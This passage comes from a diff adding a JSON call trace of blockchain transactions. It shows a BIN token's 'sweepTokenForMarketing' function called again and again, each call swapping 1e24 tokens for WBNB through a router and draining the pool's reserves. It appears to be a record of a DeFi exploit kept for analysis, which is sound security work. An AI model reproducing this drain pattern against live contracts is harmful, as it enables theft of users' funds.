+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2015221445255362781 [2.015e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "63947435571376123814 [6.394e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "32652882184550549714540985 [3.265e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "2015221445255362781 [2.015e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "2015221445255362781 [2.015e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "9048305953898063254994587 [9.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "63947435571376123814 [6.394e19], 32652882184550549714540985 [3.265e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "33652882184550549714540985 [3.365e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1895597102957529460 [1.895e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1895597102957529460 [1.895e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "62051838468418594354 [6.205e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "33652882184550549714540985 [3.365e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1895597102957529460 [1.895e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1895597102957529460 [1.895e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "8048305953898063254994587 [8.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "62051838468418594354 [6.205e19], 33652882184550549714540985 [3.365e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "34652882184550549714540985 [3.465e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1786321101527279168 [1.786e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1786321101527279168 [1.786e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "60265517366891315186 [6.026e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "34652882184550549714540985 [3.465e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1786321101527279168 [1.786e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1786321101527279168 [1.786e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "7048305953898063254994587 [7.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "60265517366891315186 [6.026e19], 34652882184550549714540985 [3.465e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "35652882184550549714540985 [3.565e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1686233074929711720 [1.686e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1686233074929711720 [1.686e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "58579284291961603466 [5.857e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "35652882184550549714540985 [3.565e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1686233074929711720 [1.686e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1686233074929711720 [1.686e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "6048305953898063254994587 [6.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "58579284291961603466 [5.857e19], 35652882184550549714540985 [3.565e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "36652882184550549714540985 [3.665e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1594330880016395439 [1.594e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1594330880016395439 [1.594e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "56984953411945208027 [5.698e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "36652882184550549714540985 [3.665e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1594330880016395439 [1.594e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1594330880016395439 [1.594e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "5048305953898063254994587 [5.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "56984953411945208027 [5.698e19], 36652882184550549714540985 [3.665e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "37652882184550549714540985 [3.765e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1509745392484756274 [1.509e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1509745392484756274 [1.509e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "55475208019460451753 [5.547e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "37652882184550549714540985 [3.765e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1509745392484756274 [1.509e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1509745392484756274 [1.509e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "4048305953898063254994587 [4.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "55475208019460451753 [5.547e19], 37652882184550549714540985 [3.765e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "38652882184550549714540985 [3.865e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1431719865930099017 [1.431e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1431719865930099017 [1.431e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "54043488153530352736 [5.404e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "38652882184550549714540985 [3.865e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1431719865930099017 [1.431e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1431719865930099017 [1.431e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "3048305953898063254994587 [3.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "54043488153530352736 [5.404e19], 38652882184550549714540985 [3.865e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "39652882184550549714540985 [3.965e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "1359592933612415223 [1.359e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1359592933612415223 [1.359e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "52683895219917937513 [5.268e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "39652882184550549714540985 [3.965e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "1359592933612415223 [1.359e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "1359592933612415223 [1.359e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "2048305953898063254994587 [2.048e24]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "52683895219917937513 [5.268e19], 39652882184550549714540985 [3.965e25], 1710126485 [1.71e9]",
